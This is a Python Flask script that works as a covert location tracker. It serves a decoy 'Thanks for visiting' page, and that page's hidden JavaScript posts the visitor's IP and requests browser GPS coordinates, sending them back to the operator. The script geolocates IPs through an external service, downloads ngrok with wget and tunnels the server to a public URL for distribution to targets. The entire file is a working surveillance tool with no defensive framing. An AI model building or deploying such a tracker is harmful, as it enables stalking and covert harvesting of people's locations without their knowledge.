import requests
import datetime
import os
import time
import subprocess
from flask import Flask, request, render_template_string
from threading import Thread

app = Flask(__name__)

HTML_BASIC = """
<!doctype html>
<html><head><title>Welcome</title></head>
<body><h2>Thanks for visiting</h2><p>Your IP has been logged.</p></body>
</html>
"""

HTML_IMMEDIATE = """
<!DOCTYPE html>
<html>
<head>
  <title>Accurate Location Tracker</title>
</head>
<body>
  <h2>Thanks for visiting!</h2>
  <p>Your IP has been logged.</p>
  <script>
    fetch("/log_ip", {method: "POST"}).catch(() => {});
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        function(position) {
          fetch("/submit_location", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              latitude: position.coords.latitude,
              longitude: position.coords.longitude,
              accuracy: position.coords.accuracy
            })
          }).catch(() => {});
        }
      );
    }
  </script>
</body>
</html>
"""

def get_location(ip):
    try:
        res = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
        data = res.json()
        if data["status"] == "success":
            return {
                "IP": ip,
                "City": data.get("city"),
                "Region": data.get("regionName"),
                "Country": data.get("country"),
                "Latitude": data.get("lat"),
                "Longitude": data.get("lon"),
                "ISP": data.get("isp"),
                "Map": f"https://www.google.com/maps?q={data.get('lat')},{data.get('lon')}",
                "Time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            }
    except:
        pass
    return {"IP": ip, "Error": "Could not get location"}

@app.route('/')
def index():
    return render_template_string(HTML_BASIC)

@app.route('/log_ip', methods=["POST"])
def log_ip():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    data = get_location(ip)
    print("\n--- Immediate IP Captured ---")
    for k, v in data.items():
        print(f"{k}: {v}")
    print("----------------------------\n")
    return "IP logged"

@app.route('/submit_location', methods=["POST"])
def submit_location():
    data = request.get_json()
    lat = data.get("latitude")
    lon = data.get("longitude")
    accuracy = data.get("accuracy")
    print("\n--- Accurate Location Captured (GPS) ---")
    print(f"Latitude: {lat}")
    print(f"Longitude: {lon}")
    print(f"Accuracy: {accuracy} meters")
    print(f"Map: https://www.google.com/maps?q={lat},{lon}")
    print("----------------------------------------\n")
    return "Location received!"

@app.route('/immediate')
def immediate():
    return render_template_string(HTML_IMMEDIATE)

def download_ngrok():
    if not os.path.isfile("ngrok"):
        os.system("wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip -O ngrok.zip")
        os.system("unzip ngrok.zip && rm ngrok.zip && chmod +x ngrok")

def start_ngrok():
    token = input("Enter your Ngrok Authtoken: ").strip()
    download_ngrok()
    os.system(f"./ngrok authtoken {token}")
    process = subprocess.Popen(["./ngrok", "http", "5000"], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    url = ""
    for _ in range(20):
        try:
            tunnels = requests.get("http://127.0.0.1:4040/api/tunnels").json()
            url = tunnels['tunnels'][0]['public_url']
            break
        except:
            time.sleep(1)
    if url:
        print(f"\033[92m[✓] Ngrok URL: {url}/immediate\033[0m")
    else:
        print("\033[91m[✗] Failed to get Ngrok URL.\033[0m")
        process.terminate()
    return process

def run_flask():
    app.run(host="0.0.0.0", port=5000)

def start_tracker():
    ngrok_process = start_ngrok()
    flask_thread = Thread(target=run_flask)
    flask_thread.start()
    try:
        while flask_thread.is_alive():
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nExiting...")
        ngrok_process.terminate()

if __name__ == '__main__':
    start_tracker()
